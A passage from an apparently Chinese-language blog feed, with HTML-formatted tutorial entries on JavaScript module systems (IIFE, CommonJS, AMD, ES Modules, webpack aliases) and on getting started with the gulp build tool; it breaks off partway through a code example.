        <content type="html"><![CDATA[<ul><li>模块化的演变过程</li><li>ES Modules</li><li>Polyfill</li><li>ES Module与CommonJS交互</li><li>import中的@</li></ul><h2 id="模块化的演变过程"><a href="#模块化的演变过程" class="headerlink" title="模块化的演变过程"></a>模块化的演变过程</h2><ol><li>基于文件的划分模块的方式</li></ol><blockquote><p>所有模块都直接在全局工作，没有私有空间，所有成员都可以在模块外部被访问或者修改，</p><p>而且模块一段多了过后，容易产生命名冲突，</p><p>另外无法管理模块与模块之间的依赖关系</p></blockquote><ol start="2"><li>命名空间方式</li></ol><blockquote><p>具体做法就是在第一阶段的基础上，通过将每个模块「包裹」为一个全局对象的形式实现，</p><p>有点类似于为模块内的成员添加了「命名空间」的感觉。</p><p>通过「命名空间」减小了命名冲突的可能，</p><p>但是同样没有私有空间，所有模块成员也可以在模块外部被访问或者修改，</p><p>而且也无法管理模块之间的依赖关系。</p></blockquote><ol start="3"><li>IIFE：立即执行函数，实现了私有成员</li></ol><blockquote><p>具体做法就是将每个模块成员都放在一个函数提供的私有作用域中，</p><p>对于需要暴露给外部的成员，通过挂在到全局对象上的方式实现</p><p>有了私有成员的概念，私有成员只能在模块成员内通过闭包的形式访问。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// module a 相关状态数据和功能函数，IIFE</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">'module-a'</span>  <span class="token keyword">function</span> method1 <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">'#method1'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> method2 <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">'#method2'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  window<span class="token punctuation">.</span>moduleA <span class="token operator">=</span> <span class="token punctuation">{</span>    method1<span class="token punctuation">:</span> method1<span class="token punctuation">,</span>    method2<span class="token punctuation">:</span> method2  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ol start="4"><li>CommonJS规范（node环境）</li></ol><ul><li>一个文件就是一个模块</li><li>每个模块都有单独的作用域</li><li>通过<code>module.exports</code>导出成员</li><li>通过require函数载入模块</li></ul><blockquote><p>浏览器端不能使用，因为CommonJS是以同步模式加载模块，每一次页面加载都会有大量模块请求</p></blockquote><ol start="5"><li>AMD：Asynchronous Module Definition （异步模块定义）</li></ol><blockquote><p>同时期推出了require.js，实现了AMD规范</p><p>目前绝大数第三方库都支持AMD规范</p><p>但是AMD使用起来比较复杂，模块JS文件请求频繁</p></blockquote><ol start="6"><li>Sea.js + CMD ：Common Module Definition </li></ol><blockquote><p>类似于CommonJS的语法</p></blockquote><h2 id="ES-Modules"><a href="#ES-Modules" class="headerlink" title="ES Modules"></a>ES Modules</h2><ul><li>CommonJS in Node.js（目前Node8以上也支持ES Modules）</li><li>ES Modules in Browsers（ES6）</li></ul><h3 id="ES-Modules-基本特性"><a href="#ES-Modules-基本特性" class="headerlink" title="ES Modules 基本特性"></a>ES Modules 基本特性</h3><ul><li>自动采用严格模式，忽略 ‘use strict’</li><li>每个 ES Module 都是运行在单独的私有作用域中</li><li>ESM 是通过 CORS 的方式请求外部 JS 模块的</li><li>ESM 的 script 标签会延迟执行脚本</li></ul><pre class=" language-html"><code class="language-html">  <span class="token comment" spellcheck="true">&lt;!-- 通过给 script 添加 type = module 的属性，就可以以 ES Module 的标准执行其中的 JS 代码了 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'this is es module'</span><span class="token punctuation">)</span>  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 1. ESM 自动采用严格模式，忽略 'use strict' --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// undefined</span>  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 2. 每个 ES Module 都是运行在单独的私有作用域中 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token number">100</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span>  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span>  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 3. ESM 是通过 CORS 的方式请求外部 JS 模块的 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/jquery@3.4.1/dist/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token comment" spellcheck="true">&lt;!-- 4. ESM 的 script 标签会延迟执行脚本,此处会先执行p标签 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">defer</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>demo.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>需要显示的内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span> </code></pre><h3 id="ES-Modules-的导入导出"><a href="#ES-Modules-的导入导出" class="headerlink" title="ES Modules 的导入导出"></a>ES Modules 的导入导出</h3><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// app.js</span><span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token keyword">default</span> <span class="token keyword">as</span> fooName<span class="token punctuation">,</span> fooHello<span class="token punctuation">,</span> Person <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./module.js'</span><span class="token keyword">import</span> height23 <span class="token keyword">from</span> <span class="token string">'./module.js'</span> <span class="token comment" spellcheck="true">// 接收default</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fooName<span class="token punctuation">,</span> fooHello<span class="token punctuation">,</span> Person<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// modeule.js</span><span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">'foo module'</span><span class="token keyword">var</span> height <span class="token operator">=</span> <span class="token number">180</span><span class="token keyword">function</span> hello <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token punctuation">{</span> name <span class="token keyword">as</span> <span class="token keyword">default</span><span class="token punctuation">,</span> hello <span class="token keyword">as</span> fooHello<span class="token punctuation">,</span> Person <span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> height<span class="token comment" spellcheck="true">// index.html</span><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"module"</span> src<span class="token operator">=</span><span class="token string">"app.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h3 id="几点注意事项"><a href="#几点注意事项" class="headerlink" title="几点注意事项"></a>几点注意事项</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> name <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./module.js'</span> <span class="token comment" spellcheck="true">// 不能省略.js</span><span class="token keyword">import</span> <span class="token punctuation">{</span> lowercase <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./utils/index.js'</span> <span class="token comment" spellcheck="true">// 不能省略index.js，否则找不到</span><span class="token keyword">import</span> <span class="token punctuation">{</span> name <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./module.js'</span> <span class="token comment" spellcheck="true">// 不能省略./，否则认为加载第三方模块</span><span class="token keyword">import</span> <span class="token string">'./module.js'</span> <span class="token comment" spellcheck="true">// 加载这个模块但是不提取</span><span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> mod <span class="token keyword">from</span> <span class="token string">'./module.js'</span> <span class="token comment" spellcheck="true">// 提取所有放入mod对象中</span><span class="token comment" spellcheck="true">// 下面这两种方式不正确，不能动态条件导入</span><span class="token keyword">var</span> modulePath <span class="token operator">=</span> <span class="token string">'./module.js'</span><span class="token keyword">import</span> <span class="token punctuation">{</span> name <span class="token punctuation">}</span> <span class="token keyword">from</span> modulePathconsole<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">import</span> <span class="token punctuation">{</span> name <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./module.js'</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 那怎么动态导入呢</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./module.js'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>module<span class="token punctuation">)</span> <span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 提取默认成员和正常成员</span><span class="token keyword">import</span> abc<span class="token punctuation">,</span> <span class="token punctuation">{</span> name<span class="token punctuation">,</span> age <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./module.js'</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> abc<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 直接导出导入成员</span><span class="token comment" spellcheck="true">// button.js</span><span class="token keyword">var</span> Button <span class="token operator">=</span> <span class="token string">'Button Component'</span><span class="token keyword">export</span> <span class="token keyword">default</span> Button<span class="token comment" spellcheck="true">// avatar.js</span><span class="token keyword">export</span> <span class="token keyword">var</span> Avatar <span class="token operator">=</span> <span class="token string">'Avatar Component'</span><span class="token comment" spellcheck="true">// index.js</span><span class="token keyword">export</span> <span class="token punctuation">{</span> <span class="token keyword">default</span> <span class="token keyword">as</span> Button <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./button.js'</span><span class="token keyword">export</span> <span class="token punctuation">{</span> Avatar <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./avatar.js'</span><span class="token comment" spellcheck="true">// 第三方模块都是导出默认成员</span><span class="token keyword">import</span> _ <span class="token keyword">from</span> <span class="token string">'lodash'</span><span class="token keyword">import</span> <span class="token punctuation">{</span> camelCase <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'lodash'</span> <span class="token comment" spellcheck="true">// 不正确</span></code></pre><h2 id="Polyfill"><a href="#Polyfill" class="headerlink" title="Polyfill"></a>Polyfill</h2><p><code>ie</code>浏览器不兼容<code>ES Modules</code></p><p>Polyfill 是一块代码（通常是 Web 上的 JavaScript），用来为旧浏览器提供它没有原生支持的较新的功能。</p><blockquote><p>例如，querySelectorAll是很多现代浏览器都支持的原生Web API，但是有些古老的浏览器并不支持，那么假设有人写了库，只要用了这个库， 你就可以在古老的浏览器里面使用document.querySelectorAll，使用方法跟现代浏览器原生API无异。那么这个库就可以称为Polyfill或者Polyfiller。</p><p>jQuery是不是一个Polyfill?答案是No。因为它并不是实现一些标准的原生API，而是封装了自己API。一个Polyfill是抹平新老浏览器 标准原生API 之间的差距的一种封装，而不是实现自己的API。</p><p>把旧的浏览器想象成为一面有了裂缝的墙.这些[polyfills]会帮助我们把这面墙的裂缝抹平,还我们一个更好的光滑的墙壁(浏览器)</p></blockquote><h2 id="ES-Module与CommonJS交互"><a href="#ES-Module与CommonJS交互" class="headerlink" title="ES Module与CommonJS交互"></a>ES Module与CommonJS交互</h2><p>在node原生环境中</p><ul><li>ES Modules中可以导入CommonJS模块</li><li>CommonJS中可以导入ES Modules模块</li><li>CommonJS始终只会导出一个默认成员</li><li>注意import不是解构对象</li></ul><p><code>es-module.mjs</code>    文件名要改成.mjs</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// ES Module 中可以导入 CommonJS 模块</span><span class="token keyword">import</span> mod <span class="token keyword">from</span> <span class="token string">'./commonjs.js'</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>mod<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 不能直接提取成员，注意 import 不是解构导出对象</span><span class="token keyword">import</span> <span class="token punctuation">{</span> foo <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./commonjs.js'</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token string">'es module export value'</span></code></pre><p><code>commonjs.js</code></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// CommonJS 模块始终只会导出一个默认成员</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  foo<span class="token punctuation">:</span> <span class="token string">'commonjs exports value'</span><span class="token punctuation">}</span>exports<span class="token punctuation">.</span>foo <span class="token operator">=</span> <span class="token string">'commonjs exports value'</span><span class="token comment" spellcheck="true">// 不能在 CommonJS 模块中通过 require 载入 ES Module</span><span class="token keyword">const</span> mod <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./es-module.mjs'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>mod<span class="token punctuation">)</span></code></pre><blockquote><p>无论是<code>require</code>或者<code>import</code>，目前仍然需要通过<code>babel</code>或者<code>traceur</code>之类的转义工具将之转义为<code>ES5</code>语法，才能在浏览器里运行。</p></blockquote><h2 id="import中的"><a href="#import中的" class="headerlink" title="import中的@"></a>import中的@</h2><blockquote><p>这是webpack的路径别名，相关代码定义在配置文件webpack.base.config里：</p></blockquote><pre class=" language-js"><code class="language-js">    resolve<span class="token punctuation">:</span> <span class="token punctuation">{</span>    extensions<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'.js'</span><span class="token punctuation">,</span> <span class="token string">'.vue'</span><span class="token punctuation">,</span> <span class="token string">'.json'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    alias<span class="token punctuation">:</span> <span class="token punctuation">{</span>      <span class="token string">'vue$'</span><span class="token punctuation">:</span> <span class="token string">'vue/dist/vue.esm.js'</span><span class="token punctuation">,</span>      <span class="token string">'@'</span><span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token string">'lib'</span><span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src/lib'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token string">'style'</span><span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src/style'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token string">'com'</span><span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src/components'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token string">'serv'</span><span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src/service'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token string">'api'</span><span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src/api'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token string">'store'</span><span class="token punctuation">:</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'src/store'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 模块化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gulp构建工具</title>
      <link href="2020/09/01/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96-gulp%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/"/>
      <url>2020/09/01/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96-gulp%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是gulp"><a href="#什么是gulp" class="headerlink" title="什么是gulp"></a>什么是gulp</h2><p><a href="http://gulpjs.com/" target="_blank" rel="noopener">gulpjs</a>是一个前端构建工具，与<a href="http://gruntjs.com/" target="_blank" rel="noopener">gruntjs</a>相比，gulpjs无需写一大堆繁杂的配置参数，API也非常简单，学习起来很容易，而且gulpjs使用的是nodejs中<a href="http://nodejs.org/api/stream.html" target="_blank" rel="noopener">stream</a>来读取和操作数据，其速度更快。 </p><p><strong>gulp：The streaming build system</strong></p><h2 id="gulp初体验"><a href="#gulp初体验" class="headerlink" title="gulp初体验"></a>gulp初体验</h2><p>初始一个项目文件夹叫<code>gulp</code>，使用<code>npm init</code>初始化<code>package.json</code>文件，然后使用<code>cnpm install -g gulp</code>安装</p><p>依赖，<code>code gulpfile.js</code>新建一个<code>gulpfile.js</code>文件，作为入口文件，示例如下：</p><pre class=" language-js"><code class="language-js">exports<span class="token punctuation">.</span>foo <span class="token operator">=</span> done <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'foo task working~'</span><span class="token punctuation">)</span>  <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 标识任务完成</span><span class="token punctuation">}</span>exports<span class="token punctuation">.</span><span class="token keyword">default</span> <span class="token operator">=</span> done <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'default task working~'</span><span class="token punctuation">)</span>  <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 标识任务完成</span><span class="token punctuation">}</span><span class="token keyword">const</span> gulp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp'</span><span class="token punctuation">)</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">'bar'</span><span class="token punctuation">,</span> done <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'bar working'</span><span class="token punctuation">)</span>  <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 分别运行如下：</span><span class="token comment" spellcheck="true">// gulp foo</span><span class="token comment" spellcheck="true">// gulp</span><span class="token comment" spellcheck="true">// gulp bar</span></code></pre><h3 id="组合任务（串行，并行）"><a href="#组合任务（串行，并行）" class="headerlink" title="组合任务（串行，并行）"></a>组合任务（串行，并行）</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token punctuation">{</span> series<span class="token punctuation">,</span> parallel <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp'</span><span class="token punctuation">)</span><span class="token keyword">const</span> task1 <span class="token operator">=</span> done <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'task1'</span><span class="token punctuation">)</span>    <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">const</span> task2 <span class="token operator">=</span> done <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'task2'</span><span class="token punctuation">)</span>    <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">const</span> task3 <span class="token operator">=</span> done <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'task3'</span><span class="token punctuation">)</span>    <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">}</span>exports<span class="token punctuation">.</span>foo <span class="token operator">=</span> <span class="token function">series</span><span class="token punctuation">(</span>task1<span class="token punctuation">,</span> task2<span class="token punctuation">,</span> task3<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// 串行</span>exports<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token function">parallel</span><span class="token punctuation">(</span>task1<span class="token punctuation">,</span> task2<span class="token punctuation">,</span> task3<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 并行</span><span class="token comment" spellcheck="true">// 执行 gulp foo, gulp bar</span></code></pre><h3 id="gulp处理异步任务"><a href="#gulp处理异步任务" class="headerlink" title="gulp处理异步任务"></a>gulp处理异步任务</h3><pre class=" language-js"><code class="language-js">exports<span class="token punctuation">.</span>callback <span class="token operator">=</span> done <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'callback'</span><span class="token punctuation">)</span>  <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>exports<span class="token punctuation">.</span>callback_error <span class="token operator">=</span> done <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'callback error'</span><span class="token punctuation">)</span>  <span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'task failed'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>exports<span class="token punctuation">.</span>promise <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise task'</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>exports<span class="token punctuation">.</span>promise_error <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise task'</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'task failed'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">const</span> timeout <span class="token operator">=</span> time <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> time<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>exports<span class="token punctuation">.</span><span class="token keyword">async</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">await</span> <span class="token function">timeout</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async task'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 处理文件 stream</span>exports<span class="token punctuation">.</span>stream <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> readStream <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">createReadStream</span><span class="token punctuation">(</span><span class="token string">'package.json'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> writeStream <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">createWriteStream</span><span class="token punctuation">(</span><span class="token string">'temp.txt'</span><span class="token punctuation">)</span>  readStream<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>writeStream<span class="token punctuation">)</span>  <span class="token keyword">return</span> readStream<span class="token punctuation">}</span></code></pre><h2 id="压缩过程实现"><a href="#压缩过程实现" class="headerlink" title="压缩过程实现"></a>压缩过程实现</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">{</span> Transform <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'stream'</span><span class="token punctuation">)</span>exports<span class="token punctuation">.</span><span class="token keyword">default</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 文件读取流</span>  <span class="token keyword">const</span> read <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">createReadStream</span><span class="token punctuation">(</span><span class="token string">'foo.css'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 文件写入流</span>  <span class="token keyword">const</span> write <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">createWriteStream</span><span class="token punctuation">(</span><span class="token 